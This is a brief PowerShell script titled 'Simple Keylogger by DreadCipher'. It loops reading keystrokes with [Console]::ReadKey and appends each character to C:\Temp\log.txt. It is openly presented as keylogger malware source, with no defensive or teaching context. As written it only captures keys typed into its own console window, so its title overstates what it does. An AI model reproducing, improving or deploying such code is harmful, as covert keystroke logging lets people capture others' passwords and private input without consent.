# Simple Keylogger by DreadCipher
while ($true) {
    Start-Sleep -Milliseconds 100
    if ([Console]::KeyAvailable) {
        $key = [Console]::ReadKey($true)
        $key.Char | Out-File -FilePath "C:\Temp\log.txt" -Append
    }
}